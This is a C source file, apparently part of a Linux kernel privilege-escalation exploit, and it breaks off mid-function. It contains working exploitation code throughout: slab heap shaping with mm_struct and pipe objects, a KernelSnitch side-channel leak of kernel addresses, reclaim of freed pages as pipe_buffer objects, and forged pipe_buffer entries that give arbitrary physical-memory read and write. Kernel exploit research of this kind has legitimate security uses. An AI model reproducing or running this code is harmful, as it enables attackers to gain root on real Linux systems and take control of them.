#include "common.h"

#define PIPE_SHAPE_ROUNDS 0
#define PHYSRW_PROOF_OFF 0x7000
#define PHYS_READ_TAG "nebusec_70687973727730"
#define PHYS_WRITE_TAG "nebusec_70687973727731"
#define PHYS64_SEED 0x306365737562656eULL
#define PHYS64_NEXT 0x316365737562656eULL
#define ZERO_ORACLE_MAGIC 0x3065636172747a63ULL

static int pipe_objects_ready;
static int pipe_fds_n[PIPE_N_COUNT][2];
static int pipe_fds_c[PIPE_C_COUNT][2];
static int pipe_fds_e[PIPE_E_COUNT][2];
static int pipe_fds_drain[PIPE_DRAIN][2];
static int pipe_fds_reclaim[PIPE_RECLAIM][2];
static int pipei_drain_fds[PIPEI_DRAIN_COUNT][2];
static int pipei_reclaim_fds[PIPEI_RECLAIM_COUNT][2];
static int pipei_live_fds[PIPEI_LIVE_COUNT][2];
static int pipei_live_ready;
static uintptr_t pipei_candidate_bases[PIPEI_RECLAIM_MAX_BASES];
static size_t pipei_candidate_base_count;

pid_t pipe_prepare_child = -1;
uint64_t kmalloc_pipe_cache;
uint64_t kmalloc_normal_1k_cache;
uint64_t kmalloc_normal_2k_cache;
uint64_t kmalloc_cgroup_1k_cache;
uint64_t kmalloc_cgroup_2k_cache;
uint64_t candidate_slab_cache;
int pipe_cache_gate_ok;
int pipe_cache_page_index = -1;
int pipe_cache_slot_hit = -1;
uint64_t pipe_page_slab_cache[PIPE_CANDIDATE_PAGES];
uint32_t pipe_page_type[PIPE_CANDIDATE_PAGES];
uintptr_t pipebuf_page_base;
uintptr_t pipebuf_addr;
int pipebuf_pipe_idx = -1;
char physrw_readback[64];
char physrw_after_write[64];
int physrw_read_ok;
int physrw_write_ok;
int pipe_scan_vmemmap;
int pipe_scan_ops;
int pipe_scan_len;
int pipe_probe_found;
uint64_t pipe_probe_page;
uint64_t pipe_probe_ops;
uint64_t pipe_probe_private;
uint32_t pipe_probe_len;
uint32_t pipe_probe_flags;
uint64_t pipe_scan_first_page;
uint64_t pipe_scan_first_ops;
uint64_t pipe_scan_q0;
uint64_t pipe_scan_q1;
uint64_t pipe_scan_q2;
uint64_t pipe_scan_q3;
uint32_t pipe_scan_first_len;
uint32_t pipe_scan_first_flags;
uint64_t physrw_read64_before;
uint64_t physrw_read64_after;
uint64_t physrw_write64_value;
int physrw_read64_ok;
int physrw_write64_ok;

struct zero_oracle_marker {
  uint64_t magic;
  uint32_t attempt;
  uint32_t check;
};

static void init_pipe_array(int fds[][2], size_t count) {
  for (size_t i = 0; i < count; i++) {
    fds[i][0] = -1;
    fds[i][1] = -1;
  }
}

static void close_pipe_array(int fds[][2], size_t count) {
  for (size_t i = 0; i < count; i++) {
    if (fds[i][0] >= 0) {
      close(fds[i][0]);
      fds[i][0] = -1;
    }
    if (fds[i][1] >= 0) {
      close(fds[i][1]);
      fds[i][1] = -1;
    }
  }
}

static void drain_pipe_array_nonblock(int fds[][2], size_t count) {
  unsigned char buf[4096];

  for (size_t i = 0; i < count; i++) {
    int fd = fds[i][0];
    if (fd < 0) {
      continue;
    }
    int flags = fcntl(fd, F_GETFL, 0);
    if (flags < 0) {
      continue;
    }
    fcntl(fd, F_SETFL, flags | O_NONBLOCK);
    while (read(fd, buf, sizeof(buf)) > 0) {
    }
    fcntl(fd, F_SETFL, flags);
  }
}

static void kill_ctx_children_once(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->childs[i] > 0) {
      kill_child(ctx->childs[i]);
      ctx->childs[i] = -1;
    }
  }
}

static int parse_env_u64(const char *name, uintptr_t def,
                         uintptr_t min, uintptr_t max, uintptr_t *out) {
  const char *arg = getenv(name);
  char *end = NULL;
  unsigned long long value;

  if (!arg || !*arg) {
    *out = def;
    return 1;
  }
  errno = 0;
  value = strtoull(arg, &end, 0);
  if (errno || !end || *end || value < min || value > max) {
    pr_warning("bad %s value: %s\n", name, arg);
    return 0;
  }
  *out = (uintptr_t)value;
  return 1;
}

static int parse_i64_token(const char *text, int64_t *out) {
  char *end = NULL;
  long long value;

  if (!text || !*text) {
    return 0;
  }
  errno = 0;
  value = strtoll(text, &end, 0);
  if (errno || !end || *end) {
    return 0;
  }
  *out = (int64_t)value;
  return 1;
}

static int env_bool(const char *name, int def) {
  const char *arg = getenv(name);

  if (!arg || !*arg) {
    return def;
  }
  return strcmp(arg, "0") != 0;
}

static const char *tmp_uname_name(void) {
  const char *name = getenv("TMP_UNAME_NAME");

  if (name && *name) {
    return name;
  }
  return TMP_UNAME_DEFAULT_NAME;
}

void print_uname_line(const char *tag) {
  struct utsname u;

  memset(&u, 0, sizeof(u));
  if (uname(&u) != 0) {
    pr_warning("%s uname failed errno=%d\n", tag, errno);
    return;
  }
  pr_info("%s uname='%s %s %s %s %s'\n", tag, u.sysname, u.nodename,
          u.release, u.version, u.machine);
}

static int uname_has_tmp_name(void) {
  struct utsname u;

  memset(&u, 0, sizeof(u));
  if (uname(&u) != 0) {
    return 0;
  }
  return strcmp(u.sysname, tmp_uname_name()) == 0;
}

static int zero_oracle_requested(void) {
  return env_bool("TMP_UNAME_ZERO_ORACLE", 0) ||
         env_bool("TMP_UNAME_PIPEI_ZERO_ORACLE", 0) ||
         env_bool("TMP_UNAME_LIVE_ZERO_ORACLE", 0);
}

static int pipei_align_order_requested(void) {
  return env_bool("TMP_UNAME_PIPEI_ALIGN_ORDER", 0);
}

static int pipei_split_order_pages_requested(void) {
  return env_bool("TMP_UNAME_PIPEI_SPLIT_ORDER_PAGES", 0);
}

static void make_zero_oracle_marker(struct zero_oracle_marker *marker,
                                    int attempt) {
  marker->magic = ZERO_ORACLE_MAGIC;
  marker->attempt = (uint32_t)attempt;
  marker->check = ~marker->attempt;
}

static int zero_page_has_marker(const struct zero_oracle_marker *marker) {
  unsigned char observed[sizeof(*marker)];
  void *map = mmap(NULL, PAGE_SIZE, PROT_READ,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (map == MAP_FAILED) {
    pr_warning("zero oracle mmap failed errno=%d\n", errno);
    return 0;
  }

  memcpy(observed, map, sizeof(observed));
  munmap(map, PAGE_SIZE);
  return memcmp(observed, marker, sizeof(*marker)) == 0;
}

static int write_pipe_array_payload(int fds[][2], size_t count,
                                    const void *payload, size_t payload_len) {
  int ok = 0;

  for (size_t i = 0; i < count; i++) {
    if (fds[i][1] < 0) {
      continue;
    }
    ssize_t wrote = write(fds[i][1], payload, payload_len);
    if (wrote == (ssize_t)payload_len) {
      ok++;
    }
  }
  return ok;
}

static uintptr_t leak_kernelsnitch_anchor_once(const char *tag) {
  setup_kernelsnitch();
  pid_t child = clone_leak_child();
  int memfd = open_memfd(child);
  SYSCHK(waitpid(child, NULL, 0));
  if (!kernelsnitch_collisions_ready()) {
    pr_warning("%s KernelSnitch collision finding failed\n", tag);
    cleanup_kernelsnitch();
    close(memfd);
    return 0;
  }

  run_kernelsnitch_bruteforce();
  uintptr_t leaked = current_kernelsnitch_mm_struct();
  cleanup_kernelsnitch();
  close(memfd);
  if (leaked == (uintptr_t)-1) {
    pr_warning("%s KernelSnitch mm_struct leak failed\n", tag);
    return 0;
  }
  return leaked;
}

void init_ctx(struct mm_ctx *ctx, size_t cnt) {
  ctx->mm_cnt = cnt;
  ctx->childs = calloc(sizeof(pid_t), cnt);
  ctx->memfds = calloc(sizeof(int), cnt);
}

void resize_pipe_slots(int pipefd[2], size_t slots) {
  SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE));
}

void make_pipe_object(int pipefd[2]) {
  SYSCHK(pipe(pipefd));
  resize_pipe_slots(pipefd, 2);
}

void alloc_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, PIPE_BUFFER_SLOTS);
}

void free_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, 2);
}

void shape_pipe_cache_once(void) {
  for (size_t i = 0; i < PIPE_N_COUNT; i++) {
    alloc_pipe_object(pipe_fds_n[i]);
  }
  for (size_t i = 0; i < PIPE_C_COUNT; i++) {
    alloc_pipe_object(pipe_fds_c[i]);
  }
  for (size_t i = 0; i < PIPE_E_COUNT; i++) {
    alloc_pipe_object(pipe_fds_e[i]);
  }
  for (size_t i = 0; i < PIPE_N_COUNT; i += PIPE_OBJS_PER_SLAB) {
    free_pipe_object(pipe_fds_n[i]);
  }
  for (size_t i = 0; i < PIPE_E_COUNT; i++) {
    free_pipe_object(pipe_fds_e[i]);
  }
  for (size_t i = 0; i < PIPE_C_COUNT; i += PIPE_OBJS_PER_SLAB) {
    free_pipe_object(pipe_fds_c[i]);
  }
}

void shape_pipe_cache(void) {
  for (int round = 0; round < PIPE_SHAPE_ROUNDS; round++) {
    for (size_t i = 0; i < PIPE_N_COUNT; i++) {
      free_pipe_object(pipe_fds_n[i]);
    }
    for (size_t i = 0; i < PIPE_C_COUNT; i++) {
      free_pipe_object(pipe_fds_c[i]);
    }
    for (size_t i = 0; i < PIPE_E_COUNT; i++) {
      free_pipe_object(pipe_fds_e[i]);
    }
    shape_pipe_cache_once();
  }
}

uintptr_t prepare_pipe_buffer_page_child(void) {
  struct mm_ctx prep;
  struct mm_ctx spray;
  struct mm_ctx pre;
  struct mm_ctx post;
  size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;

  init_ctx(&prep, 32 * objs_per_slab);
  init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
  init_ctx(&pre, objs_per_slab - 1);
  init_ctx(&post, objs_per_slab);

  for (size_t i = 0; i < prep.mm_cnt; i++) {
    prep.childs[i] = -1;
    prep.memfds[i] = clone_memfd();
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    spray.childs[i] = -1;
    spray.memfds[i] = clone_memfd();
  }

  setup_kernelsnitch();

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    pre.childs[i] = -1;
    pre.memfds[i] = clone_memfd();
  }
  pid_t leak_child = clone_leak_child();
  for (size_t i = 0; i < post.mm_cnt; i++) {
    post.childs[i] = -1;
    post.memfds[i] = clone_memfd();
  }
  int leak_memfd = open_memfd(leak_child);

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    kill_child(pre.childs[i]);
  }
  for (size_t i = 0; i < post.mm_cnt; i++) {
    kill_child(post.childs[i]);
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    kill_child(spray.childs[i]);
  }
  SYSCHK(waitpid(leak_child, NULL, 0));

  if (!kernelsnitch_collisions_ready()) {
    pr_error("pipe KernelSnitch collision finding failed\n");
  }

  unsigned char *buf = malloc(SKB_SEND_SIZE);
  memset(buf, 0x50, SKB_SEND_SIZE);

  int skb_sv[2];
  int pcp_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv));
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_sv[0], &msg, 0));
  pin_to_core(CORE);

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre.mm_cnt; i++) {
    SYSCHK(close(pre.memfds[i]));
  }
  for (size_t i = 0; i < post.mm_cnt - 1; i++) {
    SYSCHK(close(post.memfds[i]));
  }
  for (size_t i = 0; i < spray.mm_cnt; i += objs_per_slab) {
    SYSCHK(close(spray.memfds[i]));
  }
  SYSCHK(close(pcp_sv[0]));
  SYSCHK(close(pcp_sv[1]));

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(leak_memfd));
  SYSCHK(sendmsg(skb_sv[0], &msg, 0));

  run_kernelsnitch_bruteforce();
  uintptr_t leaked = cleanup_kernelsnitch();
  if (leaked == (uintptr_t)-1) {
    pr_error("pipe KernelSnitch sk_buff page leak failed\n");
  }
  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);

  shape_pipe_cache();

  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    alloc_pipe_object(pipe_fds_drain[i]);
  }

  pin_to_core(CORE);
  SYSCHK(close(skb_sv[0]));
  SYSCHK(close(skb_sv[1]));
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    alloc_pipe_object(pipe_fds_reclaim[i]);
  }

  free(buf);
  return base;
}

uintptr_t prepare_pipe_buffer_page(void) {
  if (PIPE_SHAPE_ROUNDS != 0) {
    for (size_t i = 0; i < PIPE_N_COUNT; i++) {
      make_pipe_object(pipe_fds_n[i]);
    }
    for (size_t i = 0; i < PIPE_C_COUNT; i++) {
      make_pipe_object(pipe_fds_c[i]);
    }
    for (size_t i = 0; i < PIPE_E_COUNT; i++) {
      make_pipe_object(pipe_fds_e[i]);
    }
  }
  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    make_pipe_object(pipe_fds_drain[i]);
  }
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    make_pipe_object(pipe_fds_reclaim[i]);
  }
  pipe_objects_ready = 1;

  int result_pipe[2];
  SYSCHK(pipe(result_pipe));
  pid_t child = SYSCHK(fork());
  if (child == 0) {
    SYSCHK(close(result_pipe[0]));
    uintptr_t base = prepare_pipe_buffer_page_child();
    SYSCHK(write(result_pipe[1], &base, sizeof(base)));
    for (;;) {
      sleep(60);
    }
  }

  pipe_prepare_child = child;
  SYSCHK(close(result_pipe[1]));
  uintptr_t base = 0;
  ssize_t got = read(result_pipe[0], &base, sizeof(base));
  SYSCHK(close(result_pipe[0]));
  if (got != (ssize_t)sizeof(base)) {
    pr_error("pipe page child did not report base\n");
  }
  return base;
}

void reset_pipe_attempt(void) {
  if (pipe_prepare_child > 0) {
    kill(pipe_prepare_child, SIGKILL);
    waitpid(pipe_prepare_child, NULL, 0);
    pipe_prepare_child = -1;
  }

  if (pipe_objects_ready) {
    for (size_t i = 0; i < PIPE_DRAIN; i++) {
      close(pipe_fds_drain[i][0]);
      close(pipe_fds_drain[i][1]);
    }
    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
      close(pipe_fds_reclaim[i][0]);
      close(pipe_fds_reclaim[i][1]);
    }
    pipe_objects_ready = 0;
  }

  pipebuf_page_base = 0;
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_cache_gate_ok = 0;
  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  candidate_slab_cache = 0;
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
}

uintptr_t direct_to_page(uintptr_t addr) {
  uintptr_t pfn = (addr - DIRECT_MAP_BASE) >> PAGE_SHIFT;
  return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
}

uintptr_t direct_to_head_page(int fd, uintptr_t addr) {
  uintptr_t page = direct_to_page(addr);
  uintptr_t head_addr = page + STRUCT_PAGE_COMPOUND_HEAD_OFF;
  uint64_t compound_head = kernel_read64(fd, head_addr);
  if (compound_head & 1) {
    return compound_head & ~1ULL;
  }
  return page;
}

uintptr_t page_to_direct(uintptr_t page) {
  uintptr_t pfn = (page - VMEMMAP_START) / STRUCT_PAGE_SIZE;
  return DIRECT_MAP_BASE + (pfn << PAGE_SHIFT);
}

uintptr_t pipe_buf_ops_addr(void) {
  return text_addr(ANON_PIPE_BUF_OPS);
}

int pipe_cache_matches(uint64_t slab_cache) {
  if (slab_cache == 0) {
    return 0;
  }
  if (KMALLOC_PIPE_INDEX == 10) {
    return slab_cache == kmalloc_normal_1k_cache ||
           slab_cache == kmalloc_cgroup_1k_cache;
  }
  if (KMALLOC_PIPE_INDEX == 11) {
    return slab_cache == kmalloc_normal_2k_cache ||
           slab_cache == kmalloc_cgroup_2k_cache;
  }
  return slab_cache == kmalloc_pipe_cache;
}

int pipe_reclaim_cache_gate(int fd) {
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 0;
  }

  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  memset(pipe_page_slab_cache, 0, sizeof(pipe_page_slab_cache));
  memset(pipe_page_type, 0, sizeof(pipe_page_type));

  uint64_t cache_slots[KMALLOC_CACHE_SLOTS];
  memset(cache_slots, 0, sizeof(cache_slots));
  uintptr_t kmalloc_caches = data_addr(KMALLOC_CACHES);
  kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));
  kmalloc_normal_1k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_normal_2k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 11];
  kmalloc_cgroup_1k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_cgroup_2k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 11];

  kmalloc_pipe_cache =
    kernel_read64(fd, data_addr(KMALLOC_CGROUP_PIPE_SLOT));
  for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
    uintptr_t page = pipebuf_page_base + off;
    uintptr_t head = direct_to_head_page(fd, page);
    uint64_t slab_cache = kernel_read64(fd, head + STRUCT_SLAB_CACHE_OFF);
    uintptr_t type_addr = head + STRUCT_PAGE_TYPE_OFF;
    uint32_t page_type = (uint32_t)kernel_read64(fd, type_addr);
    pipe_page_slab_cache[off / PAGE_SIZE] = slab_cache;
    pipe_page_type[off / PAGE_SIZE] = page_type;
    int cache_match = pipe_cache_matches(slab_cache);
    if (off == 0 || cache_match) {
      candidate_slab_cache = slab_cache;
    }
    for (int slot = 0; slot < KMALLOC_CACHE_SLOTS; slot++) {
      if (cache_slots[slot] == slab_cache) {
        pipe_cache_slot_hit = slot;
      }
    }
    if (cache_match) {
      pipebuf_page_base = page;
      pipe_cache_page_index = off / PAGE_SIZE;
      pipe_cache_gate_ok = 1;
      return 1;
    }
  }

  pipe_cache_gate_ok = 0;
  return 0;
}

int read_pipe_slab(int fd, uintptr_t base, unsigned char *slab) {
  for (size_t off = 0; off < ORDER3_SIZE; off += PIPE_SCAN_CHUNK) {
    if (kernel_read_data(fd, base + off, slab + off, PIPE_SCAN_CHUNK) !=
        PIPE_SCAN_CHUNK) {
      return 0;
    }
  }
  return 1;
}

int find_pipe_buffer(int fd, uintptr_t base) {
  unsigned char slab[ORDER3_SIZE];
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  pipe_scan_vmemmap = 0;
  pipe_scan_ops = 0;
  pipe_scan_len = 0;
  pipe_scan_first_page = 0;
  pipe_scan_first_ops = 0;
  pipe_scan_first_len = 0;
  pipe_scan_first_flags = 0;
  pipe_scan_q0 = 0;
  pipe_scan_q1 = 0;
  pipe_scan_q2 = 0;
  pipe_scan_q3 = 0;
  if (!read_pipe_slab(fd, base, slab)) {
    return 0;
  }
  memcpy(&pipe_scan_q0, slab + 0x00, 8);
  memcpy(&pipe_scan_q1, slab + 0x08, 8);
  memcpy(&pipe_scan_q2, slab + 0x10, 8);
  memcpy(&pipe_scan_q3, slab + 0x18, 8);

  for (size_t off = 0; off + sizeof(struct user_pipe_buffer) <= ORDER3_SIZE;
       off += 8) {
    struct user_pipe_buffer pb;
    memcpy(&pb, slab + off, sizeof(pb));
    if (pb.page >= VMEMMAP_START && pb.page < VMEMMAP_END) {
      pipe_scan_vmemmap++;
      if (pipe_scan_first_page == 0) {
        pipe_scan_first_page = pb.page;
        pipe_scan_first_ops = pb.ops;
        pipe_scan_first_len = pb.len;
        pipe_scan_first_flags = pb.flags;
      }
    } else {
      continue;
    }
    if (pb.ops == pipe_buf_ops_addr()) {
      pipe_scan_ops++;
    }
    if (pb.len > 0 && pb.len <= PIPE_RECLAIM) {
      pipe_scan_len++;
    }
    if (pb.offset != 0 || pb.ops != pipe_buf_ops_addr() ||
        pb.flags != PIPE_BUF_FLAG_CAN_MERGE || pb.private != 0) {
      continue;
    }
    if (pb.len == 0 || pb.len > PIPE_RECLAIM) {
      continue;
    }

    pipebuf_addr = base + off;
    pipebuf_pipe_idx = (int)pb.len - 1;
    pipe_probe_found = 1;
    pipe_probe_page = pb.page;
    pipe_probe_ops = pb.ops;
    pipe_probe_private = pb.private;
    pipe_probe_len = pb.len;
    pipe_probe_flags = pb.flags;
    return 1;
  }

  return 0;
}

int pipe_phys_read(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    void *out, size_t len) {
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

  ssize_t got = read(pipefd[0], out, len);
  int ok = got == (ssize_t)len;
  kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
  return ok;
}

int pipe_phys_write(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    const void *data, size_t len) {
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = 0;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

  ssize_t wrote = write(pipefd[1], data, len);
  int ok = wrote == (ssize_t)len;
  kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
  return ok;
}

void forge_pipe_buffers_on_page(
    int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write) {
  struct user_pipe_buffer pb;
  memset(&pb, 0, sizeof(pb));
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = for_write ? 0 : len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;

  for (size_t off = 0; off < PIPE_SLAB_SIZE; off += PIPE_OBJECT_SIZE) {
    kernel_write_data(fd, base + off, &pb, sizeof(pb));
  }
}

int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    return 0;
  }
  if (!is_direct_ptr(direct_addr) ||
      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
    return 0;
  }

  if (pipebuf_addr) {
    int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
    return pipe_phys_read(fd, pipefd, pipebuf_addr, direct_addr, out, len);
  } else {
    forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 0);
    ssize_t got = read(pipe_fds_reclaim[pipebuf_pipe_idx][0], out, len);
    return got == (ssize_t)len;
  }
}

int pipe_phys_write_data(
    int fd, uintptr_t direct_addr, const void *data, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    return 0;
  }
  if (!is_direct_ptr(direct_addr) ||
      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
    return 0;
  }

  if (pipebuf_addr) {
    int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
    return pipe_phys_write(fd, pipefd, pipebuf_addr, direct_addr, data, len);
  } else {
    forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 1);
    ssize_t wrote = write(pipe_fds_reclaim[pipebuf_pipe_idx][1], data, len);
    return wrote == (ssize_t)len;
  }
}

uint64_t pipe_read64(int fd, uintptr_t direct_addr) {
  uint64_t value = 0;
  pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));
  return value;
}

uint32_t pipe_read32(int fd, uintptr_t direct_addr) {
  uint32_t value = 0;
  pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));
  return value;
}

int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
  return pipe_phys_write_data(fd, direct_addr, &value, sizeof(value));
}

static uintptr_t pipe_inode_tmp_page_target(uintptr_t base, size_t slot) {
  size_t page = slot / PIPE_INODE_INFO_SLOTS_PER_PAGE;
  size_t slot_in_page = slot % PIPE_INODE_INFO_SLOTS_PER_PAGE;

  return base + page * PAGE_SIZE +
         slot_in_page * PIPE_INODE_INFO_SIZE + PIPE_TMP_PAGE_OFF;
}

static void pipei_candidate_bases_reset(void) {
  memset(pipei_candidate_bases, 0, sizeof(pipei_candidate_bases));
  pipei_candidate_base_count = 0;
}

static void pipei_candidate_bases_add(uintptr_t base) {
  for (size_t i = 0; i < pipei_candidate_base_count; i++) {
    if (pipei_candidate_bases[i] == base) {
      return;
    }
  }
  if (pipei_candidate_base_count >= PIPEI_RECLAIM_MAX_BASES) {
    pr_error("too many pipei candidate bases count=%zu max=%d\n",
             pipei_candidate_base_count, PIPEI_RECLAIM_MAX_BASES);
  }
  pipei_candidate_bases[pipei_candidate_base_count++] = base;
}

static void pipei_candidate_bases_add_order_pages(uintptr_t order_base) {
  for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
    pipei_candidate_bases_add(order_base + off);
  }
}

static size_t pipei_base_start_index(size_t base_count) {
  uintptr_t value = 0;
  const char *arg = getenv("TMP_UNAME_PIPEI_BASE_START");

  if (!arg || !*arg) {
    return 0;
  }
  if (!parse_env_u64("TMP_UNAME_PIPEI_BASE_START", 0, 0,
                     base_count - 1, &value)) {
    pr_error("bad TMP_UNAME_PIPEI_BASE_START value: %s base_count=%zu\n",
             arg, base_count);
  }
  return (size_t)value;
}

static size_t pipei_base_limit_count(size_t base_count, size_t base_start) {
  uintptr_t value = 0;
  const char *arg = getenv("TMP_UNAME_PIPEI_BASE_LIMIT");
  size_t remaining = base_count - base_start;

  if (!arg || !*arg) {
    return remaining;
  }
  if (!parse_env_u64("TMP_UNAME_PIPEI_BASE_LIMIT", 0, 0,
                     remaining, &value)) {
    pr_error("bad TMP_UNAME_PIPEI_BASE_LIMIT value: %s base_count=%zu "
             "base_start=%zu\n", arg, base_count, base_start);
  }
  if (value == 0) {
    return remaining;
  }
  return (size_t)value;
}

static void make_pipe_pair(int fds[2]) {
  SYSCHK(pipe(fds));
}

static uintptr_t prepare_pipe_inode_candidate_page(void) {
  struct mm_ctx prep;
  struct mm_ctx spray;
  struct mm_ctx pre;
  struct mm_ctx post;
  size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  uintptr_t base = 0;

  pipei_candidate_bases_reset();
  memset(&prep, 0, sizeof(prep));
  memset(&spray, 0, sizeof(spray));
  memset(&pre, 0, sizeof(pre));
  memset(&post, 0, sizeof(post));
  init_ctx(&prep, 32 * objs_per_slab);
  init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
  init_ctx(&pre, objs_per_slab - 1);
  init_ctx(&post, objs_per_slab);

  for (size_t i = 0; i < prep.mm_cnt; i++) {
    prep.childs[i] = clone_child();
    prep.memfds[i] = open_memfd(prep.childs[i]);
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    spray.childs[i] = clone_child();
    spray.memfds[i] = open_memfd(spray.childs[i]);
  }

  setup_kernelsnitch();
  for (size_t i = 0; i < pre.mm_cnt; i++) {
    pre.childs[i] = clone_child();
  }
  pid_t leak_child = clone_leak_child();
  for (size_t i = 0; i < post.mm_cnt; i++) {
    post.childs[i] = clone_child();
  }
  for (size_t i = 0; i < pre.mm_cnt; i++) {
    pre.memfds[i] = open_memfd(pre.childs[i]);
  }
  int leak_memfd = open_memfd(leak_child);
  for (size_t i = 0; i < post.mm_cnt; i++) {
    post.memfds[i] = open_memfd(post.childs[i]);
  }

  kill_ctx_children_once(&pre);
  kill_ctx_children_once(&post);
  kill_ctx_children_once(&spray);
  SYSCHK(waitpid(leak_child, NULL, 0));
  if (!kernelsnitch_collisions_ready()) {
    pr_warning("pipei KernelSnitch collision finding failed\n");
    cleanup_kernelsnitch();
    goto out;
  }

  init_pipe_array(pipei_drain_fds, PIPEI_DRAIN_COUNT);
  init_pipe_array(pipei_reclaim_fds, PIPEI_RECLAIM_COUNT);
  for (int i = 0; i < PIPEI_DRAIN_COUNT; i++) {
    make_pipe_pair(pipei_drain_fds[i]);
  }

  close_ctx_memfds(&pre);
  for (size_t i = 0; i + 1 < post.mm_cnt; i++) {
    if (post.memfds[i] > 0) {
      close(post.memfds[i]);
      post.memfds[i] = -1;
    }
  }
  for (size_t i = 0; i < spray.mm_cnt; i += objs_per_slab) {
    if (spray.memfds[i] > 0) {
      close(spray.memfds[i]);
      spray.memfds[i] = -1;
    }
  }

  pin_to_core(CORE);
  for (int i = 0; i < 4; i++) {
    sched_yield();
  }
  SYSCHK(close(leak_memfd));
  for (int i = 0; i < 4; i++) {
    sched_yield();
  }
  for (int i = 0; i < PIPEI_RECLAIM_COUNT; i++) {
    make_pipe_pair(pipei_reclaim_fds[i]);
  }

  run_kernelsnitch_bruteforce();
